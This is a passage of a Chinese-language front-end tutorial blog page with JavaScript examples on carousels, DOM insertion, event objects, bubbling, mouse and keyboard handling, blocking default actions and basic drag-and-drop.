</span><br><span class="line">		if(now==aBtn.length)</span><br><span class="line">		&#123;</span><br><span class="line">			now=0;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		tab();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	var timer=setInterval(next, 2000);  //每两秒调用next函数实现自动切换</span><br><span class="line">	</span><br><span class="line">	oDiv.onmouseover=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		clearInterval(timer);</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	oDiv.onmouseout=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		timer=setInterval(next, 2000);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;play&quot; id=&quot;play&quot;&gt;</span><br><span class="line">    &lt;ol&gt;</span><br><span class="line">    	&lt;li class=&quot;active&quot;&gt;1&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;2&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;3&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;4&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;5&lt;/li&gt;</span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">	&lt;ul&gt;</span><br><span class="line">		&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;images/1.jpg&quot; alt=&quot;广告一&quot; /&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;images/2.jpg&quot; alt=&quot;广告二&quot; /&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;images/3.jpg&quot; alt=&quot;广告三&quot; /&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;images/4.jpg&quot; alt=&quot;广告四&quot; /&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;images/5.jpg&quot; alt=&quot;广告五&quot; /&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">	&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="例子微博信息发布效果">例子：微博信息发布效果</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">* &#123;margin:0; padding:0;&#125;</span><br><span class="line">#ul1 &#123;width:400px; height:400px; border:1px solid black; margin:10px auto; overflow:hidden;&#125;</span><br><span class="line">#ul1 li &#123;border-bottom:1px #999 dashed; padding:4px; list-style:none; overflow:hidden; filter:alpha(opacity:0); opacity:0;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;move2.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	var oUl=document.getElementById(&apos;ul1&apos;);</span><br><span class="line">	var oTxt=document.getElementById(&apos;txt1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		var oLi=document.createElement(&apos;li&apos;);  //创建元素</span><br><span class="line">		</span><br><span class="line">		oLi.innerHTML=oTxt.value;   //显示文本</span><br><span class="line">		oTxt.value=&apos;&apos;;</span><br><span class="line">		</span><br><span class="line">		if(oUl.children.length&gt;0)  //倒序插入</span><br><span class="line">		&#123;</span><br><span class="line">			oUl.insertBefore(oLi, oUl.children[0]);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			oUl.appendChild(oLi);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		//运动</span><br><span class="line">		var iHeight=oLi.offsetHeight;  //取高度</span><br><span class="line">		</span><br><span class="line">		oLi.style.height=&apos;0&apos;;</span><br><span class="line">		</span><br><span class="line">		startMove(oLi, &#123;height: iHeight&#125;, function ()&#123;</span><br><span class="line">			startMove(oLi, &#123;opacity: 100&#125;);</span><br><span class="line">		&#125;);</span><br><span class="line">		//alert(iHeight);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;textarea id=&quot;txt1&quot; rows=&quot;4&quot; cols=&quot;40&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;发布&quot; /&gt;</span><br><span class="line">&lt;ul id=&quot;ul1&quot;&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
<h1><span id="js事件基础">JS事件基础</span></h1><h2><span id="event对象和事件冒泡">event对象和事件冒泡</span></h2><h3><span id="event对象">event对象</span></h3><p>  Event 对象代表事件的状态，比如事件在其中发生的元素、键盘按键的状态、鼠标的位置、鼠标按钮的状态。事件通常与函数结合使用，函数不会在事件发生前被执行！</p>
<h4><span id="点击">点击</span></h4><ul>
<li>直接用document.onclick</li>
<li>document.body 可能撑不开</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	document.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;a&apos;);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4><span id="document">document</span></h4><ul>
<li>&lt;!DOCTYPE HTML&gt;也是一个节点</li>
<li>&lt;!DOCTYPE HTML&gt;和HTML都是document的子节点</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	alert(document.childNodes[1].tagName);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3><span id="获取event对象兼容性写法">获取event对象(兼容性写法)</span></h3><ul>
<li>var oEvent=ev||event;</li>
</ul>
<h4><span id="点击坐标">点击坐标</span></h4><ul>
<li>clientX–获取x坐标值</li>
<li>clientY–获取y坐标值</li>
<li>event 只能在IE下用</li>
<li>火狐下用ev</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	document.onclick=function (ev)</span><br><span class="line">	&#123;</span><br><span class="line">		//IE</span><br><span class="line">		//alert(event.clientX+&apos;,&apos;+event.clientY);</span><br><span class="line">		</span><br><span class="line">		//FF</span><br><span class="line">		//alert(ev.clientX+&apos;,&apos;+ev.clientY);</span><br><span class="line">		</span><br><span class="line">		var oEvent=ev||event;  //处理兼容性</span><br><span class="line">		</span><br><span class="line">		alert(oEvent.clientX+&apos;,&apos;+oEvent.clientY);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3><span id="事件流">事件流</span></h3><h4><span id="事件冒泡">事件冒泡</span></h4><ul>
<li>事件会随着层级传给父级</li>
</ul>
<h4><span id="取消冒泡">取消冒泡</span></h4><ul>
<li>oEvent.cancelBubble=true</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#div1 &#123;width:400px; height:300px; background:#CCC; display:none;&#125;</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function (ev)</span><br><span class="line">	&#123;</span><br><span class="line">		var oEvent=ev||event;</span><br><span class="line">		</span><br><span class="line">		oDiv.style.display=&apos;block&apos;;</span><br><span class="line">		//alert(&apos;按钮被点击了&apos;);</span><br><span class="line">		</span><br><span class="line">		oEvent.cancelBubble=true;</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	document.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		oDiv.style.display=&apos;none&apos;;</span><br><span class="line">		//alert(&apos;document被点击了&apos;);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;input1 id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;显示&quot; /&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="鼠标事件">鼠标事件</span></h2><h3><span id="鼠标位置">鼠标位置</span></h3><ul>
<li>用到client一定要用的scroll</li>
</ul>
<h4><span id="可视区位置clientx-clienty">可视区位置：clientX、clientY</span></h4><ul>
<li><p>例子1：跟随鼠标的Div</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#div1 &#123;width:200px; height:200px; background:red; position:absolute;&#125;</span><br><span class="line"></span><br><span class="line">document.onmousemove=function (ev)</span><br><span class="line">&#123;</span><br><span class="line">	var oEvent=ev||event;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv.style.left=oEvent.clientX+&apos;px&apos;;</span><br><span class="line">	oDiv.style.top=oEvent.clientY+&apos;px&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>消除滚动条的影响</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#div1 &#123;width:200px; height:200px; background:red; position:absolute;&#125;</span><br><span class="line"></span><br><span class="line">document.onmousemove=function (ev)</span><br><span class="line">&#123;</span><br><span class="line">	var oEvent=ev||event;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	var scrollTop=document.documentElement.scrollTop||document.body.scrollTop;</span><br><span class="line">	</span><br><span class="line">	oDiv.style.left=oEvent.clientX+&apos;px&apos;;</span><br><span class="line">	oDiv.style.top=oEvent.clientY+scrollTop+&apos;px&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;body style=&quot;height:2000px;&quot;&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="获取鼠标在页面的绝对位置">获取鼠标在页面的绝对位置</span></h3><h4><span id="封装函数">封装函数</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#div1 &#123;width:200px; height:200px; background:red; position:absolute;&#125;</span><br><span class="line"></span><br><span class="line">//封装函数</span><br><span class="line">function getPos(ev)</span><br><span class="line">&#123;</span><br><span class="line">	var scrollTop=document.documentElement.scrollTop||document.body.scrollTop;</span><br><span class="line">	var scrollLeft=document.documentElement.scrollLeft||document.body.scrollLeft;</span><br><span class="line">	</span><br><span class="line">	return &#123;x: ev.clientX+scrollLeft, y: ev.clientY+scrollTop&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">document.onmousemove=function (ev)</span><br><span class="line">&#123;</span><br><span class="line">	var oEvent=ev||event;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	var pos=getPos(oEvent);</span><br><span class="line">	</span><br><span class="line">	oDiv.style.left=pos.x+&apos;px&apos;;</span><br><span class="line">	oDiv.style.top=pos.y+&apos;px&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;body style=&quot;height:2000px;&quot;&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="例子2一串跟随鼠标的div">例子2：一串跟随鼠标的Div</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">div &#123;width:10px; height:10px; background:red; position:absolute;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function getPos(ev)</span><br><span class="line">&#123;</span><br><span class="line">	var scrollTop=document.documentElement.scrollTop||document.body.scrollTop;</span><br><span class="line">	var scrollLeft=document.documentElement.scrollLeft||document.body.scrollLeft;</span><br><span class="line">	</span><br><span class="line">	return &#123;x: ev.clientX+scrollLeft, y: ev.clientY+scrollTop&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">document.onmousemove=function (ev)</span><br><span class="line">&#123;</span><br><span class="line">	var aDiv=document.getElementsByTagName(&apos;div&apos;);</span><br><span class="line">	var oEvent=ev||event;</span><br><span class="line">	</span><br><span class="line">	var pos=getPos(oEvent);</span><br><span class="line">	</span><br><span class="line">	for(var i=aDiv.length-1;i&gt;0;i--)</span><br><span class="line">	&#123;</span><br><span class="line">		aDiv[i].style.left=aDiv[i-1].offsetLeft+&apos;px&apos;;</span><br><span class="line">		aDiv[i].style.top=aDiv[i-1].offsetTop+&apos;px&apos;;   //后一个等于前一个的位置</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	aDiv[0].style.left=pos.x+&apos;px&apos;;</span><br><span class="line">	aDiv[0].style.top=pos.y+&apos;px&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;div&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="键盘事件">键盘事件</span></h2><h3><span id="keycode">keyCode</span></h3><ul>
<li>获取用户按下键盘的哪个按键</li>
<li>onkeydown–按下</li>
<li>onkeyup–抬起</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">document.onkeydown=function (ev)</span><br><span class="line">&#123;</span><br><span class="line">	var oEvent=ev||event;</span><br><span class="line">	</span><br><span class="line">	alert(oEvent.keyCode);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4><span id="例子键盘控制div移动">例子：键盘控制Div移动</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#div1 &#123;width:100px; height:100px; background:#CCC; position:absolute;&#125;</span><br><span class="line"></span><br><span class="line">document.onkeydown=function (ev)</span><br><span class="line">&#123;</span><br><span class="line">	var oEvent=ev||event;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	if(oEvent.keyCode==37)</span><br><span class="line">	&#123;</span><br><span class="line">		oDiv.style.left=oDiv.offsetLeft-10+&apos;px&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	else if(oEvent.keyCode==39)</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		oDiv.style.left=oDiv.offsetLeft+10+&apos;px&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="其他属性">其他属性</span></h3><h4><span id="ctrlkey-shiftkey-altkey">ctrlKey、shiftKey、altKey</span></h4><h4><span id="例子提交留言">例子：提交留言</span></h4><ul>
<li>回车 提交</li>
<li>ctrl+回车 提交<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oTxt1=document.getElementById(&apos;txt1&apos;);</span><br><span class="line">	var oTxt2=document.getElementById(&apos;txt2&apos;);</span><br><span class="line">	</span><br><span class="line">	oTxt1.onkeydown=function (ev)</span><br><span class="line">	&#123;</span><br><span class="line">		var oEvent=ev||event;</span><br><span class="line">		</span><br><span class="line">		if(oEvent.keyCode==13 &amp;&amp; oEvent.ctrlKey)</span><br><span class="line">		&#123;</span><br><span class="line">			oTxt2.value+=oTxt1.value+&apos;\n&apos;;</span><br><span class="line">			oTxt1.value=&apos;&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;1input id=&quot;txt1&quot; type=&quot;text&quot; /&gt;&lt;br&gt;</span><br><span class="line">&lt;1textarea id=&quot;txt2&quot; rows=&quot;10&quot; cols=&quot;40&quot;&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1><span id="js事件中级">JS事件中级</span></h1><h2><span id="默认行为">默认行为</span></h2><h3><span id="默认行为">默认行为</span></h3><ul>
<li>浏览器自带的行为就是默认行为</li>
</ul>
<h3><span id="阻止默认行为">阻止默认行为</span></h3><ul>
<li>普通写法：return flase;</li>
</ul>
<h4><span id="例子1屏蔽右键菜单">例子1.屏蔽右键菜单</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.oncontextmenu=function ()</span><br><span class="line">&#123;</span><br><span class="line">	return false;	//阻止默认事件</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>自定义右键菜单<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">* &#123;margin:0; padding:0; list-style:none;&#125;</span><br><span class="line">#div1 &#123;position:absolute; width:80px; background:#CCC; border:1px solid black; display:none;&#125;</span><br><span class="line"></span><br><span class="line">document.oncontextmenu=function (ev)</span><br><span class="line">&#123;</span><br><span class="line">	var oEvent=ev||event;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv.style.display=&apos;block&apos;;</span><br><span class="line">	oDiv.style.left=oEvent.clientX+&apos;px&apos;;</span><br><span class="line">	oDiv.style.top=oEvent.clientY+&apos;px&apos;;</span><br><span class="line">	</span><br><span class="line">	return false;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">document.onclick=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv.style.display=&apos;none&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;</span><br><span class="line">	&lt;ul&gt;</span><br><span class="line">    	&lt;li&gt;aaa&lt;/li&gt;</span><br><span class="line">    	&lt;li&gt;bbb&lt;/li&gt;</span><br><span class="line">    	&lt;li&gt;ccc&lt;/li&gt;</span><br><span class="line">    	&lt;li&gt;ddd&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4><span id="例子2只能输入数字的输入框">例子2.只能输入数字的输入框</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oTxt=document.getElementById(&apos;txt1&apos;);</span><br><span class="line">	</span><br><span class="line">	oTxt.onkeydown=function (ev)</span><br><span class="line">	&#123;</span><br><span class="line">		var oEvent=ev||event;</span><br><span class="line">		</span><br><span class="line">		//alert(oEvent.keyCode);</span><br><span class="line">		</span><br><span class="line">		//0-	48</span><br><span class="line">		//9-	57</span><br><span class="line">		</span><br><span class="line">		//如果 用户按的 不是退格 并且 也不是数字</span><br><span class="line">		</span><br><span class="line">		if(oEvent.keyCode!=8 &amp;&amp; (oEvent.keyCode&lt;48 || oEvent.keyCode&gt;57))</span><br><span class="line">		&#123;</span><br><span class="line">			return false;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;1input type=&quot;text&quot; id=&quot;txt1&quot; /&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="附-keycode对照表">附 KeyCode对照表</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1.jpg" alt="javascript"><br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/2.jpg" alt="javascript"><br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/3.jpg" alt="javascript"><br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/4.jpg" alt="javascript"></p>
<h2><span id="拖拽">拖拽</span></h2><h3><span id="简易拖拽">简易拖拽</span></h3><ul>
<li>拖拽原理:鼠标与Div的距离不变，鼠标事件（onmousemove、onmousedown、onmouseup）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#div1 &#123;width:200px; height:200px; background:red; position:absolute;&#125;</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	var disX=0;</span><br><span class="line">	var disY=0;</span><br><span class="line">	</span><br><span class="line">	oDiv.onmousedown=function (ev)</span><br><span class="line">	&#123;</span><br><span class="line">		var oEvent=ev||event;</span><br><span class="line">		</span><br><span class="line">		disX=oEvent.clientX-oDiv.offsetLeft;</span><br><span class="line">		disY=oEvent.clientY-oDiv.offsetTop;</span><br><span class="line">		</span><br><span class="line">		document.onmousemove=function (ev)</span><br><span class="line">		&#123;</span><br><span class="line">			var oEvent=ev||event;</span><br><span class="line">			</span><br><span class="line">			oDiv.style.left=oEvent.clientX-disX+&apos;px&apos;;</span><br><span class="line">			oDiv.style.top=oEvent.clientY-disY+&apos;px&apos;;</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		document.onmouseup=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			document.onmousemove=null;   //鼠标抬起时，div不能再移动</span><br><span class="line">			document.onmouseup=null;   	</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="靠谱拖拽">靠谱拖拽</span></h3><h4><span id="原有拖拽的问题">原有拖拽的问题</span></h4><ul>
